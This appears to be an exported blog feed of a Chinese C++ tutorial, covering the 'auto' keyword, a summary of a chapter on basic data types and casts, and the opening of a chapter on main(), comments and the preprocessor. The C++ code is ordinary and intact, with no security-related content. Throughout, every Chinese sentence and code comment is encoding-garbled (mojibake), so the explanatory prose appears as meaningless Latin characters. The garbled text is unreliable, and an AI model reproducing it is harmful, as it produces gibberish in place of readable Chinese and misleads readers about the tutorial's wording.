è¿­ä»£å™¨æˆ–æ¨¡æ¿ç±»å‹ï¼‰æ—¶ã€‚</p><p><strong>å·¥ä½œåŸç†:</strong></p><p>å½“ä½ ä½¿ç”¨ <code>auto</code> å£°æ˜å˜é‡æ—¶ï¼Œå¿…é¡»æä¾›ä¸€ä¸ªåˆå§‹åŒ–è¡¨è¾¾å¼ã€‚ç¼–è¯‘å™¨ä¼šæŸ¥çœ‹è¿™ä¸ªè¡¨è¾¾å¼çš„ç±»å‹ï¼Œå¹¶å°†è¯¥ç±»å‹èµ‹äºˆ <code>auto</code> å£°æ˜çš„å˜é‡ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">auto</span> variableName = initializationExpression;</span><br></pre></td></tr></table></figure><p><strong>è¦ç‚¹:</strong></p><ul><li>  <strong>å¿…é¡»åˆå§‹åŒ–:</strong> ä½¿ç”¨ <code>auto</code> å£°æ˜çš„å˜é‡å¿…é¡»åœ¨å£°æ˜æ—¶åˆå§‹åŒ–ã€‚</li><li>  <strong>ç±»å‹æ¨æ–­:</strong> ç±»å‹æ˜¯ä»åˆå§‹åŒ–è¡¨è¾¾å¼æ¨æ–­å‡ºæ¥çš„ï¼Œè€Œä¸æ˜¯å˜é‡æœ¬èº«çš„æŸç§é»˜è®¤ç±»å‹ã€‚</li><li><strong><code>const</code> å’Œå¼•ç”¨:</strong> <code>auto</code> é€šå¸¸ä¸ä¼šè‡ªåŠ¨æ¨æ–­å‡ºé¡¶å±‚çš„ <code>const</code> æˆ–å¼•ç”¨ã€‚å¦‚æœéœ€è¦ <code>const</code> æˆ–å¼•ç”¨ï¼Œéœ€è¦æ˜¾å¼æ·»åŠ ã€‚<ul><li>  <code>auto x = value;</code> // x çš„ç±»å‹ä¸ value ç›¸åŒ (const/å¼•ç”¨è¢«å‰¥ç¦»)</li><li>  <code>const auto cx = value;</code> // cx æ˜¯ const ç±»å‹</li><li>  <code>auto&amp; rx = value;</code> // rx æ˜¯å¼•ç”¨ç±»å‹</li><li>  <code>const auto&amp; crx = value;</code> // crx æ˜¯ const å¼•ç”¨ç±»å‹</li></ul></li><li><strong>åˆ—è¡¨åˆå§‹åŒ–:</strong> å¯¹äº C++11 ä¸­çš„åˆ—è¡¨åˆå§‹åŒ– <code>&#123;&#125;</code>ï¼Œ<code>auto</code> çš„æ¨æ–­è§„åˆ™æ¯”è¾ƒç‰¹æ®Šã€‚<ul><li>  <code>auto x = &#123;1, 2, 3&#125;;</code> // C++11/14: x è¢«æ¨æ–­ä¸º std::initializer_list<int></li><li>  <code>auto y = &#123;1&#125;;</code> // C++11/14: y è¢«æ¨æ–­ä¸º std::initializer_list<int></li><li>  <code>auto z&#123;1&#125;;</code> // C++17: z è¢«æ¨æ–­ä¸º int (æ³¨æ„æ²¡æœ‰ç­‰å·)</li></ul></li></ul><p><strong>ç”¨æ³•ä¸ç¤ºä¾‹:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt; // åŒ…å« vector</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;typeinfo&gt; // ç”¨äº typeid (ä»…ä½œæ¼”ç¤º)</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// åŸºæœ¬ç±»å‹æ¨æ–­</span></span><br><span class="line">    <span class="keyword">auto</span> i = <span class="number">10</span>;       <span class="comment">// i è¢«æ¨æ–­ä¸º int</span></span><br><span class="line">    <span class="keyword">auto</span> d = <span class="number">3.14</span>;     <span class="comment">// d è¢«æ¨æ–­ä¸º double</span></span><br><span class="line">    <span class="keyword">auto</span> f = <span class="number">3.14f</span>;    <span class="comment">// f è¢«æ¨æ–­ä¸º float</span></span><br><span class="line">    <span class="keyword">auto</span> c = <span class="string">&#x27;A&#x27;</span>;      <span class="comment">// c è¢«æ¨æ–­ä¸º char</span></span><br><span class="line">    <span class="keyword">auto</span> b = <span class="literal">true</span>;     <span class="comment">// b è¢«æ¨æ–­ä¸º bool</span></span><br><span class="line">    <span class="keyword">auto</span> ll = <span class="number">1234567890L</span>L; <span class="comment">// ll è¢«æ¨æ–­ä¸º long long</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Type of i: &quot;</span> &lt;&lt; <span class="keyword">typeid</span>(i).name() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Type of d: &quot;</span> &lt;&lt; <span class="keyword">typeid</span>(d).name() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Type of f: &quot;</span> &lt;&lt; <span class="keyword">typeid</span>(f).name() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Type of ll: &quot;</span> &lt;&lt; <span class="keyword">typeid</span>(ll).name() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ¨æ–­è¡¨è¾¾å¼ç»“æœç±»å‹</span></span><br><span class="line">    <span class="keyword">auto</span> sum = i + d; <span class="comment">// i(int) + d(double) -&gt; double, sum è¢«æ¨æ–­ä¸º double</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Type of sum: &quot;</span> &lt;&lt; <span class="keyword">typeid</span>(sum).name() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;sum = &quot;</span> &lt;&lt; sum &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ¨æ–­ const å’Œå¼•ç”¨ (éœ€è¦æ˜¾å¼æ·»åŠ )</span></span><br><span class="line">    <span class="keyword">int</span> original = <span class="number">100</span>;</span><br><span class="line">    <span class="keyword">auto</span> copy = original;         <span class="comment">// copy æ˜¯ int (éå¼•ç”¨, é const)</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">auto</span> const_copy = original; <span class="comment">// const_copy æ˜¯ const int</span></span><br><span class="line">    <span class="keyword">auto</span>&amp; ref = original;         <span class="comment">// ref æ˜¯ int&amp; (å¼•ç”¨)</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">auto</span>&amp; const_ref = original; <span class="comment">// const_ref æ˜¯ const int&amp; (const å¼•ç”¨)</span></span><br><span class="line"></span><br><span class="line">    copy = <span class="number">200</span>; <span class="comment">// OK</span></span><br><span class="line">    <span class="comment">// const_copy = 200; // é”™è¯¯! const_copy æ˜¯ const</span></span><br><span class="line">    ref = <span class="number">300</span>; <span class="comment">// OK, original ä¹Ÿå˜ä¸º 300</span></span><br><span class="line">    <span class="comment">// const_ref = 400; // é”™è¯¯! const_ref æ˜¯ const å¼•ç”¨</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;original: &quot;</span> &lt;&lt; original &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º 300</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// ç”¨äºå¤æ‚ç±»å‹ (ä¾‹å¦‚ STL å®¹å™¨è¿­ä»£å™¨)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="built_in">std</span>::<span class="built_in">string</span>&gt; names = &#123;<span class="string">&quot;Alice&quot;</span>, <span class="string">&quot;Bob&quot;</span>, <span class="string">&quot;Charlie&quot;</span>&#125;;</span><br><span class="line">    <span class="keyword">auto</span> it = names.begin(); <span class="comment">// it è¢«æ¨æ–­ä¸º std::vector&lt;std::string&gt;::iterator</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;First name: &quot;</span> &lt;&lt; *it &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Type of it: &quot;</span> &lt;&lt; <span class="keyword">typeid</span>(it).name() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// C++11 åˆ—è¡¨åˆå§‹åŒ–</span></span><br><span class="line">    <span class="keyword">auto</span> list1 = &#123;<span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>&#125;; <span class="comment">// list1 æ˜¯ std::initializer_list&lt;int&gt;</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Type of list1: &quot;</span> &lt;&lt; <span class="keyword">typeid</span>(list1).name() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// C++17 åˆ—è¡¨åˆå§‹åŒ– (æ— ç­‰å·)</span></span><br><span class="line">    <span class="comment">// auto val&#123;42&#125;; // C++17: val æ˜¯ int</span></span><br><span class="line">    <span class="comment">// std::cout &lt;&lt; &quot;Type of val: &quot; &lt;&lt; typeid(val).name() &lt;&lt; std::endl;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>ä¼˜ç‚¹:</strong></p><ul><li>  å‡å°‘å†—ä½™ä»£ç ï¼Œå°¤å…¶æ˜¯åœ¨ç±»å‹åç§°å¾ˆé•¿æ—¶ã€‚</li><li>  æé«˜ä»£ç çš„å¯ç»´æŠ¤æ€§ï¼Œå¦‚æœåˆå§‹åŒ–è¡¨è¾¾å¼çš„ç±»å‹æ”¹å˜ï¼Œ<code>auto</code> å˜é‡çš„ç±»å‹ä¼šè‡ªåŠ¨æ›´æ–°ã€‚</li><li>  æœ‰åŠ©äºæ³›å‹ç¼–ç¨‹ã€‚</li></ul><p><strong>ç¼ºç‚¹/æ³¨æ„äº‹é¡¹:</strong></p><ul><li>  è¿‡åº¦ä½¿ç”¨å¯èƒ½é™ä½ä»£ç çš„å¯è¯»æ€§ï¼Œå› ä¸ºè¯»è€…éœ€è¦æŸ¥çœ‹åˆå§‹åŒ–è¡¨è¾¾å¼æ‰èƒ½ç¡®å®šç±»å‹ã€‚</li><li>  <code>auto</code> æ¨æ–­å‡ºçš„ç±»å‹å¯èƒ½ä¸æ˜¯ä½ æœŸæœ›çš„ï¼ˆä¾‹å¦‚ï¼Œå¿˜è®°æ·»åŠ  <code>&amp;</code> å¾—åˆ°å‰¯æœ¬è€Œä¸æ˜¯å¼•ç”¨ï¼‰ã€‚</li><li>  å¯¹äºä»£ç†ç±»ï¼ˆProxy Classesï¼‰ï¼Œ<code>auto</code> å¯èƒ½æ¨æ–­å‡ºä»£ç†ç±»å‹è€Œä¸æ˜¯æœŸæœ›çš„å€¼ç±»å‹ï¼Œéœ€è¦å°å¿ƒã€‚</li></ul><p><strong>å»ºè®®:</strong> åœ¨ç±»å‹å†—é•¿ã€æ˜æ˜¾æˆ–æ— å…³ç´§è¦æ—¶ä½¿ç”¨ <code>auto</code> å¯ä»¥æé«˜æ•ˆç‡ã€‚åœ¨ç±»å‹å¯¹äºç†è§£ä»£ç é€»è¾‘å¾ˆé‡è¦æ—¶ï¼Œæ˜¾å¼å†™å‡ºç±»å‹å¯èƒ½æ›´å¥½ã€‚</p><h2 id="3-5-æ€»ç»“"><a href="#3-5-æ€»ç»“" class="headerlink" title="3.5 æ€»ç»“"></a>3.5 æ€»ç»“</h2><p>æœ¬ç« æ·±å…¥æ¢è®¨äº†C++ç”¨äºå¤„ç†æ•°æ®çš„åŸºæœ¬å†…ç½®ç±»å‹ã€‚æˆ‘ä»¬é¦–å…ˆå­¦ä¹ äº†ç®€å•å˜é‡çš„å‘½åè§„åˆ™å’Œçº¦å®šï¼Œå¼ºè°ƒäº†åç§°çš„å¯è¯»æ€§å’Œåˆæ³•æ€§ã€‚</p><p>æ¥ç€ï¼Œæˆ‘ä»¬è¯¦ç»†ç ”ç©¶äº†C++çš„<strong>æ•´å‹å®¶æ—</strong>ï¼ŒåŒ…æ‹¬ <code>short</code>ã€<code>int</code>ã€<code>long</code> å’Œ C++11 æ–°å¢çš„ <code>long long</code>ã€‚æˆ‘ä»¬è®¨è®ºäº†å®ƒä»¬å„è‡ªçš„å¤§å°ã€è¡¨ç¤ºèŒƒå›´ä»¥åŠå¦‚ä½•é€‰æ‹©åˆé€‚çš„ç±»å‹ã€‚æˆ‘ä»¬è¿˜ä»‹ç»äº† <code>unsigned</code> ç±»å‹ï¼Œå®ƒä»¬ç”¨äºå­˜å‚¨éè´Ÿæ•´æ•°ï¼Œå¹¶å…·æœ‰æ›´å¤§çš„æ­£æ•°èŒƒå›´ã€‚æˆ‘ä»¬å­¦ä¹ äº†å¦‚ä½•ä¹¦å†™ä¸åŒè¿›åˆ¶ï¼ˆåè¿›åˆ¶ã€å…«è¿›åˆ¶ã€åå…­è¿›åˆ¶ï¼Œä»¥åŠC++14çš„äºŒè¿›åˆ¶ï¼‰çš„æ•´å‹å­—é¢å€¼ï¼Œä»¥åŠå¦‚ä½•ä½¿ç”¨åç¼€ï¼ˆ<code>U</code>, <code>L</code>, <code>LL</code>ï¼‰æ¥æŒ‡å®šå¸¸é‡çš„å…·ä½“ç±»å‹ï¼Œå¹¶äº†è§£äº†ç¼–è¯‘å™¨åœ¨æ²¡æœ‰åç¼€æ—¶å¦‚ä½•æ¨æ–­å¸¸é‡ç±»å‹ã€‚</p><p><code>char</code> ç±»å‹è¢«ä»‹ç»ä¸ºä¸€ç§ç‰¹æ®Šçš„æ•´å‹ï¼Œä¸»è¦ç”¨äºå­˜å‚¨å­—ç¬¦ï¼Œä½†ä¹Ÿå¯ä»¥ä½œä¸ºå°æ•´æ•°ä½¿ç”¨ã€‚æˆ‘ä»¬å­¦ä¹ äº†å­—ç¬¦å­—é¢å€¼ï¼ˆä½¿ç”¨å•å¼•å·ï¼‰å’Œè½¬ä¹‰åºåˆ—ã€‚<code>bool</code> ç±»å‹ä¹Ÿè¢«å¼•å…¥ï¼Œç”¨äºè¡¨ç¤ºé€»è¾‘çœŸ (<code>true</code>) å’Œå‡ (<code>false</code>)ï¼Œä»¥åŠå®ƒä¸æ•´æ•°ï¼ˆ1å’Œ0ï¼‰ä¹‹é—´çš„è½¬æ¢å…³ç³»ã€‚</p><p>ä¸ºäº†åˆ›å»ºä¸å¯ä¿®æ”¹çš„å˜é‡ï¼ˆå¸¸é‡ï¼‰ï¼Œæˆ‘ä»¬å­¦ä¹ äº† <code>const</code> é™å®šç¬¦ã€‚ä½¿ç”¨ <code>const</code> å®šä¹‰çš„å¸¸é‡å¿…é¡»åœ¨å£°æ˜æ—¶åˆå§‹åŒ–ï¼Œå®ƒæä¾›äº†ç±»å‹å®‰å…¨å’Œä½œç”¨åŸŸæ§åˆ¶ï¼Œæ˜¯æ¯” <code>#define</code> æ›´å—æ¨èçš„å¸¸é‡å®šä¹‰æ–¹å¼ã€‚</p><p>ç„¶åï¼Œæˆ‘ä»¬è½¬å‘äº†<strong>æµ®ç‚¹ç±»å‹</strong> (<code>float</code>, <code>double</code>, <code>long double</code>)ï¼Œç”¨äºè¡¨ç¤ºå¸¦å°æ•°çš„æ•°å­—ã€‚æˆ‘ä»¬å­¦ä¹ äº†ä¹¦å†™æµ®ç‚¹æ•°çš„ä¸¤ç§æ–¹å¼ï¼ˆæ ‡å‡†å°æ•°ç‚¹å’ŒEè¡¨ç¤ºæ³•ï¼‰ï¼Œäº†è§£äº†ä¸åŒæµ®ç‚¹ç±»å‹çš„ç²¾åº¦å’ŒèŒƒå›´å·®å¼‚ï¼Œä»¥åŠå¦‚ä½•ä½¿ç”¨åç¼€ï¼ˆ<code>f</code>, <code>L</code>ï¼‰æŒ‡å®šæµ®ç‚¹å¸¸é‡ç±»å‹ï¼ˆé»˜è®¤ä¸º <code>double</code>ï¼‰ã€‚æˆ‘ä»¬è¿˜è®¨è®ºäº†æµ®ç‚¹æ•°çš„ä¼˜ç‚¹ï¼ˆèŒƒå›´å¹¿ã€è¡¨ç¤ºå°æ•°ï¼‰å’Œå›ºæœ‰çš„ç¼ºç‚¹ï¼ˆç²¾åº¦é™åˆ¶ã€æ¯”è¾ƒå›°éš¾ï¼‰ã€‚</p><p>æœ€åï¼Œæˆ‘ä»¬å­¦ä¹ äº†C++çš„<strong>åŸºæœ¬ç®—æœ¯è¿ç®—ç¬¦</strong> (<code>+</code>, <code>-</code>, <code>*</code>, <code>/</code>, <code>%</code>)ã€‚æˆ‘ä»¬æ¢è®¨äº†è¿ç®—ç¬¦çš„ä¼˜å…ˆçº§å’Œç»“åˆæ€§è§„åˆ™ï¼Œä»¥åŠå¦‚ä½•ä½¿ç”¨æ‹¬å·æ¥æ§åˆ¶è¿ç®—é¡ºåºã€‚ç‰¹åˆ«åœ°ï¼Œæˆ‘ä»¬åŒºåˆ†äº†æ•´æ•°é™¤æ³•ï¼ˆç»“æœæˆªæ–­ï¼‰å’Œæµ®ç‚¹æ•°é™¤æ³•ï¼Œå¹¶å­¦ä¹ äº†æ±‚æ¨¡è¿ç®—ç¬¦ <code>%</code> çš„ç”¨æ³•ï¼ˆä¸»è¦ç”¨äºæ•´æ•°æ±‚ä½™ï¼‰ã€‚</p><p><strong>ç±»å‹è½¬æ¢</strong>æ˜¯æœ¬ç« çš„å¦ä¸€ä¸ªé‡ç‚¹ï¼ŒåŒ…æ‹¬ç¼–è¯‘å™¨è‡ªåŠ¨æ‰§è¡Œçš„éšå¼è½¬æ¢ï¼ˆå¦‚æ•´å‹æå‡å’Œç®—æœ¯è½¬æ¢ï¼‰å’Œç¨‹åºå‘˜æŒ‡å®šçš„æ˜¾å¼è½¬æ¢ï¼ˆCé£æ ¼è½¬æ¢å’Œæ›´å®‰å…¨çš„C++è½¬æ¢ç¬¦ <code>static_cast</code>ã€<code>dynamic_cast</code>ã€<code>const_cast</code>ã€<code>reinterpret_cast</code>ï¼‰ã€‚æˆ‘ä»¬å¼ºè°ƒäº†è½¬æ¢ä¸­å¯èƒ½å‡ºç°çš„ä¿¡æ¯ä¸¢å¤±é—®é¢˜ã€‚</p><p>C++11 å¼•å…¥çš„ <code>auto</code> å…³é”®å­—ä¹Ÿè¢«ä»‹ç»ï¼Œå®ƒå…è®¸ç¼–è¯‘å™¨æ ¹æ®åˆå§‹åŒ–è¡¨è¾¾å¼è‡ªåŠ¨æ¨æ–­å˜é‡ç±»å‹ï¼Œç®€åŒ–äº†ä»£ç ï¼Œå°¤å…¶æ˜¯åœ¨å¤„ç†å¤æ‚ç±»å‹æ—¶ã€‚</p><p>é€šè¿‡æœ¬ç« çš„å­¦ä¹ ï¼Œæˆ‘ä»¬æŒæ¡äº†C++çš„åŸºæœ¬æ•°æ®ç±»å‹åŠå…¶ç”¨æ³•ï¼Œä¸ºåç»­æ›´å¤æ‚çš„æ•°æ®ç»“æ„å’Œç®—æ³•æ‰“ä¸‹äº†åšå®çš„åŸºç¡€ã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> Program </tag>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Chapter 2 å¼€å§‹å­¦ä¹ C++</title>
      <link href="2025/04/26/Cpp_tutorial_Chapter_2/"/>
      <url>2025/04/26/Cpp_tutorial_Chapter_2/</url>
      
        <content type="html"><![CDATA[<h2 id="2-1-è¿›å…¥C"><a href="#2-1-è¿›å…¥C" class="headerlink" title="2.1 è¿›å…¥C++"></a>2.1 è¿›å…¥C++</h2><p>æœ¬èŠ‚å°†å¼•å¯¼ä½ ç¼–å†™ç¬¬ä¸€ä¸ªC++ç¨‹åºï¼Œå¹¶ä»‹ç»ä¸€äº›åŸºæœ¬æ¦‚å¿µã€‚</p><h3 id="2-1-1-main-å‡½æ•°"><a href="#2-1-1-main-å‡½æ•°" class="headerlink" title="2.1.1 main()å‡½æ•°"></a>2.1.1 main()å‡½æ•°</h3><p>æ¯ä¸ªC++ç¨‹åºéƒ½å¿…é¡»åŒ…å«ä¸€ä¸ªåä¸º <code>main</code> çš„å‡½æ•°ã€‚æ“ä½œç³»ç»Ÿé€šè¿‡è°ƒç”¨ <code>main</code> å‡½æ•°æ¥å¯åŠ¨C++ç¨‹åºã€‚<code>main</code> å‡½æ•°æ˜¯ç¨‹åºçš„å…¥å£ç‚¹ã€‚</p><p><strong>åŸºæœ¬ç»“æ„:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// ç¨‹åºä»£ç </span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>; <span class="comment">// è¡¨ç¤ºç¨‹åºæˆåŠŸæ‰§è¡Œ</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>  <code>int main()</code>: è¿™æ˜¯ <code>main</code> å‡½æ•°çš„å‡½æ•°å¤´ã€‚<code>int</code> è¡¨ç¤º <code>main</code> å‡½æ•°æ‰§è¡Œå®Œæ¯•åå°†è¿”å›ä¸€ä¸ªæ•´æ•°å€¼ç»™æ“ä½œç³»ç»Ÿã€‚æ‹¬å· <code>()</code> è¡¨ç¤ºè¿™æ˜¯ä¸€ä¸ªå‡½æ•°ã€‚</li><li>  <code>&#123; ... &#125;</code>: èŠ±æ‹¬å·æ ‡è®°äº†å‡½æ•°ä½“çš„å¼€å§‹å’Œç»“æŸã€‚å‡½æ•°ä½“åŒ…å«äº†ç¨‹åºè¦æ‰§è¡Œçš„æŒ‡ä»¤ï¼ˆè¯­å¥ï¼‰ã€‚</li><li>  <code>return 0;</code>: è¿™æ¡è¯­å¥è¡¨ç¤º <code>main</code> å‡½æ•°æ‰§è¡Œå®Œæ¯•ã€‚è¿”å›å€¼ <code>0</code> é€šå¸¸è¡¨ç¤ºç¨‹åºæˆåŠŸæ‰§è¡Œã€‚éé›¶è¿”å›å€¼é€šå¸¸è¡¨ç¤ºç¨‹åºé‡åˆ°äº†é”™è¯¯ã€‚</li></ul><p><strong>ç¤ºä¾‹:</strong></p><p>ä¸€ä¸ªæœ€ç®€å•çš„C++ç¨‹åºï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªç¨‹åºä»€ä¹ˆä¹Ÿä¸åšï¼Œä½†å®ƒæ˜¯ä¸€ä¸ªå®Œæ•´çš„ã€å¯ä»¥ç¼–è¯‘å’Œè¿è¡Œçš„C++ç¨‹åºã€‚</p><h3 id="2-1-2-C-æ³¨é‡Š"><a href="#2-1-2-C-æ³¨é‡Š" class="headerlink" title="2.1.2 C++æ³¨é‡Š"></a>2.1.2 C++æ³¨é‡Š</h3><p>æ³¨é‡Šæ˜¯ç¨‹åºä¸­ç”¨äºè§£é‡Šä»£ç çš„éƒ¨åˆ†ï¼Œå®ƒä»¬ä¼šè¢«ç¼–è¯‘å™¨å¿½ç•¥ï¼Œä¸ä¼šå½±å“ç¨‹åºçš„æ‰§è¡Œã€‚æ³¨é‡Šå¯ä»¥æé«˜ä»£ç çš„å¯è¯»æ€§ã€‚</p><p>C++æ”¯æŒä¸¤ç§ç±»å‹çš„æ³¨é‡Šï¼š</p><ol><li> <strong>å•è¡Œæ³¨é‡Š:</strong> ä»¥ <code>//</code> å¼€å§‹ï¼Œç›´åˆ°è¯¥è¡Œç»“æŸã€‚</li><li> <strong>å¤šè¡Œæ³¨é‡Š:</strong> ä»¥ <code>/*</code> å¼€å§‹ï¼Œä»¥ <code>*/</code> ç»“æŸï¼Œå¯ä»¥è·¨è¶Šå¤šè¡Œã€‚</li></ol><p><strong>ç”¨æ³•ä¸ç¤ºä¾‹:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt; // è¿™æ˜¯ä¸€ä¸ªå•è¡Œæ³¨é‡Šï¼Œè§£é‡ŠåŒ…å«å¤´æ–‡ä»¶</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">   è¿™æ˜¯ä¸€ä¸ªå¤šè¡Œæ³¨é‡Šã€‚</span></span><br><span class="line"><span class="comment">   å®ƒå¯ä»¥ç”¨æ¥å†™æ›´é•¿çš„è§£é‡Šã€‚</span></span><br><span class="line"><span class="comment">   ä¸‹é¢çš„ main å‡½æ•°æ˜¯ç¨‹åºçš„å…¥å£ç‚¹ã€‚</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// ä½¿ç”¨ cout è¾“å‡º &quot;Hello, World!&quot; åˆ°æ§åˆ¶å°</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Hello, World!&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// endl ç”¨äºæ¢è¡Œ</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>; <span class="comment">// ç¨‹åºæˆåŠŸç»“æŸ</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-1-3-C-é¢„å¤„ç†å™¨å’Œiostreamæ–‡ä»¶"><a href="#2-1-3-C-é¢„å¤„ç†å™¨å’Œiostreamæ–‡ä»¶" class="headerlink" title="2.1.3 C++é¢„å¤„ç†å™¨å’Œiostreamæ–‡ä»¶"></a>2.1.3 C++é¢„å¤„ç†å™¨å’Œiostreamæ–‡ä»¶</h3><p>åœ¨ç¼–è¯‘C++ç¨‹åºä¹‹å‰ï¼Œ<strong>é¢„å¤„ç†å™¨</strong>ä¼šé¦–å…ˆå¤„ç†æºä»£ç ã€‚é¢„å¤„ç†å™¨æŒ‡ä»¤ä»¥ <code>#</code> ç¬¦å·å¼€å¤´ã€‚</p><p><code>#include</code> æ˜¯ä¸€ä¸ªå¸¸è§çš„é¢„å¤„ç†å™¨æŒ‡ä»¤ï¼Œå®ƒå‘Šè¯‰é¢„å¤„ç†å™¨å°†å¦ä¸€ä¸ªæ–‡ä»¶çš„å†…å®¹åŒ…å«åˆ°å½“å‰æ–‡ä»¶ä¸­ã€‚</p><p><code>iostream</code> æ–‡ä»¶æ˜¯C++æ ‡å‡†åº“çš„ä¸€éƒ¨åˆ†ï¼ŒåŒ…å«äº†è¿›è¡Œè¾“å…¥ï¼ˆinputï¼‰å’Œè¾“å‡ºï¼ˆoutputï¼‰æ“ä½œæ‰€éœ€çš„ä¿¡æ¯ã€‚ä¾‹å¦‚ï¼Œè¦ä½¿ç”¨ <code>cout</code> è¿›è¡Œè¾“å‡ºï¼Œå°±éœ€è¦åŒ…å« 